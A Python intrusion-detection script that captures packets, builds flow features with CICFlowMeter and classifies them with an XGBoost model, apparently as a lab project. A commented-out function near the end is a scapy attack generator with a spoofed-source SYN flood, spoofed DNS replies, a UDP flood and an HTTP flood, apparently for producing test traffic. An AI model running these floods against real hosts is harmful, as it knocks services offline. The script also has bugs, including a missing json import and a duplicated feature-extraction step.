import sys
import ctypes
import os
import subprocess
import threading
import time
from datetime import datetime
import pyshark
import pandas as pd
import numpy as np
import xgboost as xgb
from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR
import random
import string
from collections import Counter
from cols import column_rename_map
# CONSTANTS
INTERFACE = "Ethernet 3"  # Change to your network interface
TARGET_IP = "192.168.18.56"  # Change to your target IP
CAPTURE_DURATION = 60  # seconds
OUTPUT_PATH = r"D:\IDS-Project\output"
CFM_PATH = r"D:\IDS-Project\CICFlowMeter-4.0\bin\cfm.bat"
INPUT_PATH = r"D:\IDS-Project\pcap_store"

# Attack class mapping
class_id_to_label = {
    0: "BENIGN",
    1: "Bot",
    2: 'DDoS',
    3: 'DoS GoldenEye',
    4: 'DoS Hulk',
    5: 'DoS Slowhttptest',
    6: 'DoS slowloris',
    7: 'FTP-Patator',
    8: 'Heartbleed',
    9: 'Infiltration',
    10: 'PortScan',
    11: 'SSH-Patator',
    12: 'Web Attack - Brute Force',
    13: 'Web Attack - Sql Injection',
    14: 'Web Attack - XSS',
}

# Feature column mapping (update with your actual column names)

with open("training_features.json") as f:
    EXPECTED_FEATURES = json.load(f)

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def ensure_admin():
    if os.name == 'nt' and not is_admin():
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, " ".join(sys.argv), None, None)
        sys.exit()

# Update your capture_pcap() function to use dumpcap.exe
def capture_pcap(interface, duration, output_file):
    try:
        # Correct paths to try (in order)
        possible_paths = [
            r"C:\Program Files\Wireshark\dumpcap.exe",
            r"C:\Program Files (x86)\Wireshark\dumpcap.exe",
            r"C:\Program Files\Wireshark\windump.exe"  # Legacy
        ]
        
        # Find the first valid path
        dumpcap_path = None
        for path in possible_paths:
            if os.path.exists(path):
                dumpcap_path = path
                break
                
        if not dumpcap_path:
            raise FileNotFoundError("Neither dumpcap.exe nor windump.exe found")
            
        cmd = [
            dumpcap_path,
            "-i", interface,
            "-w", output_file,
            "-a", f"duration:{duration}",
            "-s", "0",
            "-q"  # Quiet mode
        ]
        
        print(f"[+] Executing: {' '.join(cmd)}")
        subprocess.run(cmd, check=True, timeout=duration+5)
        return True
        
    except Exception as e:
        print(f"[!] Capture failed: {str(e)}")
        return False

def preprocess_pcap(pcap_path):
    try:
        packets = rdpcap(pcap_path)
        new_packets = []
        for pkt in packets:
            new_packets.append(pkt)
            if TCP in pkt and pkt[TCP].flags == "S":  # SYN packet
                # Add fake SYN-ACK response
                syn_ack = IP(dst=pkt[IP].src, src=pkt[IP].dst)/TCP(
                    dport=pkt[TCP].sport, 
                    sport=pkt[TCP].dport, 
                    flags="SA", 
                    seq=1000, 
                    ack=pkt[TCP].seq + 1
                )
                new_packets.append(syn_ack)
        
        enhanced_path = pcap_path.replace(".pcap", "_enhanced.pcap")
        wrpcap(enhanced_path, new_packets)
        return enhanced_path  # Make sure to return the path
    
    except Exception as e:
        print(f"[!] Preprocessing failed: {e}")
        return None

def clean_features(df):
    df = df.replace([np.inf, -np.inf], np.nan).fillna(0)
    
    if 'Flow Duration' in df.columns:
        df['Flow Duration'] = df['Flow Duration'].replace(0, 1)
        df['Flow Duration'] = df['Flow Duration'] / 1e6
    
    if 'Tot Fwd Pkts' in df.columns:
        df['Tot Fwd Pkts'] = np.log1p(df['Tot Fwd Pkts'])
    
    return df

def align_features(df):
    for feature in EXPECTED_FEATURES:
        if feature not in df.columns:
            df[feature] = 0
    return df[EXPECTED_FEATURES]

def run_cfm(cfm_path, input_file, output_folder):
    """Run CICFlowMeter to generate flow features"""
    try:
        print(f"[+] Running CICFlowMeter on {input_file}...")
        original_dir = os.getcwd()
        bin_dir = os.path.dirname(cfm_path)
        os.chdir(bin_dir)

        command = f"cfm.bat {input_file} {output_folder}"
        process = subprocess.Popen(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            shell=True
        )

        stdout, stderr = process.communicate()
        os.chdir(original_dir)

        if process.returncode != 0:
            print(f"[!] CICFlowMeter error:\n{stderr}")
            return False
        print("[+] CICFlowMeter completed successfully")
        return True
    except Exception as e:
        print(f"[!] Error running CICFlowMeter: {e}")
        return False
def predict_anomalies(csv_path, model_path="xgb_ids_model_balanced (2).json"):
    try:
        print(f"[+] Loading data from: {csv_path}")
        df = pd.read_csv(csv_path)
        
        # Apply column renaming first
        df = df.rename(columns=column_rename_map)
        df_original = df.copy()

        # Preprocessing steps - only drop columns that exist
        # Drop non-numeric and unwanted columns
        non_numeric_cols = ['Flow ID', 'Source IP', 'Destination IP', 'Timestamp', 'Label', 'Source Port', 'Destination Port']
        df = df.drop(columns=[col for col in non_numeric_cols if col in df.columns], errors='ignore')

        # Drop columns by index only if the indices exist in df
        columns_to_drop = [0, 14, 15, 36, 67]
        existing_indices = [i for i in columns_to_drop if i < df.shape[1]]
        df = df.drop(df.columns[existing_indices], axis=1)

       
        # Clean and normalize features
        df = df.replace([np.inf, -np.inf], np.nan).fillna(0)
        if 'Flow Duration' in df.columns:
            df['Flow Duration'] = df['Flow Duration'].replace(0, 1) / 1e6  # Convert to seconds
            
        # Add SYN flood detection features
        if all(col in df.columns for col in ['SYN Flag Count', 'Total Fwd Packets']):
            df['syn_ratio'] = df['SYN Flag Count'] / (df['Total Fwd Packets'] + 1e-5)
            df['short_flow'] = (df['Flow Duration'] < 0.1).astype(int)  # Flows < 100ms
        
        # Align features with model expectations
        with open("training_features.json") as f:
            expected_features = json.load(f)
        for feature in expected_features:
            if feature not in df.columns:
                df[feature] = 0
        df = df[expected_features]
       
        # Load model and predict
        print("[+] Loading XGBoost model...")
        model = xgb.Booster()
        model.load_model(model_path)
        dmatrix = xgb.DMatrix(df)
        print(dmatrix.feature_names)
        # Get prediction probabilities
        pred_probs = model.predict(dmatrix)
        print(pred_probs)
        predicted_classes = []
        confidence_scores = []
        
        for i, probs in enumerate(pred_probs):
            max_prob = max(probs)
            pred_class = np.argmax(probs)
            confidence_scores.append(max_prob)
            
            # Special handling for SYN flood patterns
            if ('syn_ratio' in df.columns and df.iloc[i]['syn_ratio'] > 0.7 and 
                df.iloc[i]['short_flow'] == 1 and 
                max_prob < 0.9):  # Lower threshold for SYN floods
                predicted_classes.append("DoS_SYN_Flood")
            else:
                predicted_classes.append(class_id_to_label.get(pred_class, "UNKNOWN"))

        # Add predictions to the original dataframe
        df_original['Prediction'] = predicted_classes
        df_original['Confidence'] = confidence_scores
        
        # Now we can apply suspicious criteria
        suspicious_criteria = (
            (df_original['SYN Flag Count'] > 100) if 'SYN Flag Count' in df_original.columns else False |
            (df_original['Flow Duration'] < 0.01) if 'Flow Duration' in df_original.columns else False |
            (df_original['Total Fwd Packets'] > 500) if 'Total Fwd Packets' in df_original.columns else False
        )
        
        # Only mark as suspicious if not already detected as an attack
        df_original.loc[suspicious_criteria & (df_original['Prediction'] == 'BENIGN'), 'Prediction'] = 'SUSPICIOUS'
        
        # Debug output - use only available columns
        print("\n[+] Detection Summary:")
        print(df_original['Prediction'].value_counts())
        
        # Highlight suspicious flows - check which columns exist first
        available_columns = [col for col in ['flow_id', 'src_ip', 'dst_ip', 'prediction', 'confidence'] 
                           if col in df_original.columns]
        
        suspicious = df_original[df_original['Prediction'].str.contains('DoS|SUSPICIOUS')]
        if not suspicious.empty:
            print("\n[!] Suspicious flows detected:")
            print(suspicious[available_columns].to_string())
        
        return df_original

    except Exception as e:
        print(f"[!] Prediction error: {e}")
        import traceback
        traceback.print_exc()
        return None
# def launch_attack(target_ip):
#     """Generate detectable DoS attacks with DNS fallback handling"""
#     try:
#         print("[+] Starting enhanced DoS attack in 3 seconds...")
#         time.sleep(3)
        
#         # Phase 1: SYN Flood (always works with IPs)
#         print("[+] Phase 1: SYN Flood (500 packets, 60% response rate)")
#         for i in range(500):
#             src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,254)}"
#             syn = IP(dst=target_ip, src=src_ip)/TCP(dport=80, flags="S", seq=i)
#             send(syn, verbose=0)
            
#             if random.random() < 0.6:
#                 time.sleep(0.005)
#                 syn_ack = IP(dst=src_ip, src=target_ip)/TCP(
#                     dport=syn[TCP].sport, sport=80,
#                     flags="SA", seq=random.randint(1000,50000), 
#                     ack=syn[TCP].seq+1
#                 )
#                 send(syn_ack, verbose=0)

#         # Phase 2: DNS Amplification with error handling
#         print("[+] Phase 2: DNS Amplification")
#         try:
#             for i in range(150):
#                 # Use safe DNS query format
#                 dns_query = IP(dst=target_ip)/UDP(dport=53)/DNS(
#                     rd=1, 
#                     qd=DNSQR(qname="example.com", qtype="A")  # Only "A" records
#                 )
#                 send(dns_query, verbose=0)
                
#                 if random.random() < 0.7:
#                     time.sleep(0.01)
#                     dns_response = IP(dst=target_ip, src="8.8.8.8")/UDP(sport=53)/DNS(
#                         id=dns_query[DNS].id,
#                         qr=1,
#                         qd=dns_query[DNS].qd,
#                         an=DNSRR(rrname=dns_query[DNS].qd.qname, ttl=10, rdata="1.1.1.1")
#                     )
#                     send(dns_response, verbose=0)
#         except Exception as e:
#             print(f"[!] DNS attack failed ({str(e)}), falling back to UDP flood")
#             # Fallback to raw UDP flood
#             for i in range(200):
#                 send(IP(dst=target_ip)/UDP(dport=random.randint(10000,60000))/Raw(load="X"*100), verbose=0)

#         # Phase 3: HTTP Flood (IP-based, no DNS needed)
#         print("[+] Phase 3: HTTP GET Flood")
#         for i in range(100):
#             payload = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"
#             send(IP(dst=target_ip)/TCP(dport=80, flags="PA")/payload, verbose=0)
            
#             if random.random() < 0.3:
#                 time.sleep(0.1)
#                 http_resp = IP(dst=target_ip, src=target_ip)/TCP(
#                     sport=80, flags="PA"
#                 )/("HTTP/1.1 200 OK\r\nContent-Length: 500\r\n\r\n" + "B"*500)
#                 send(http_resp, verbose=0)

#         print("[+] Attack completed")
        
#     except Exception as e:
#         print(f"[!] Critical attack error: {e}")
def main():
    ensure_admin()
    os.makedirs(INPUT_PATH, exist_ok=True)
    os.makedirs(OUTPUT_PATH, exist_ok=True)

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    output_pcap = os.path.join(INPUT_PATH, f"traffic_{timestamp}.pcap")
    
    # Start capture (now using direct blocking capture)
    if not capture_pcap(INTERFACE, CAPTURE_DURATION, output_pcap):
        print("[!] Exiting due to capture failure")
        return
    
    # Verify pcap exists
    if not os.path.exists(output_pcap):
        print("[!] No pcap file created. Exiting.")
        return
    
    # Enhanced processing
    try:
        print("[+] Preprocessing pcap file...")
        enhanced_pcap = preprocess_pcap(output_pcap)
        pcap_to_process = enhanced_pcap if enhanced_pcap else output_pcap
        print(f"[+] Using pcap file: {pcap_to_process}")
        
        # Run CICFlowMeter
        print(f"[+] Generating flow features from {pcap_to_process}...")
        if not run_cfm(CFM_PATH, pcap_to_process, OUTPUT_PATH):
            print("[!] CICFlowMeter processing failed")
            return
        
        # Find the generated CSV (more robust handling)
        base_name = os.path.basename(pcap_to_process).rsplit('.', 1)[0]
        csv_files = [
            f for f in os.listdir(OUTPUT_PATH)
            if f.startswith(base_name) and f.lower().endswith(".csv")
        ]
        
        if not csv_files:
            print(f"[!] No CSV found for {base_name} in {OUTPUT_PATH}")
            print(f"Available files: {os.listdir(OUTPUT_PATH)}")
            return
            
        csv_path = os.path.join(OUTPUT_PATH, csv_files[0])
        print(f"[+] Analyzing flows from: {csv_path}")
        
        # Run CICFlowMeter
        print("[+] Generating flow features...")
        if not run_cfm(CFM_PATH, pcap_to_process, OUTPUT_PATH):
            print("[!] CICFlowMeter processing failed")
            return
        
        # Find the generated CSV
        base_name = os.path.basename(pcap_to_process).split('.')[0]
        csv_files = [f for f in os.listdir(OUTPUT_PATH) 
                   if f.startswith(base_name) and f.endswith(".csv")]
        
        if not csv_files:
            print("[!] No CSV file generated by CICFlowMeter")
            return
            
        csv_path = os.path.join(OUTPUT_PATH, csv_files[0])
        print(f"[+] Analyzing flows from: {csv_path}")
        
        result = predict_anomalies(csv_path)
        
        if result is not None:
            output_csv = csv_path.replace(".csv", "_predictions.csv")
            result.to_csv(output_csv, index=False)
            print("\n[+] Detection results saved to:", output_csv)
            
    except Exception as e:
        print(f"[!] Processing error: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main() 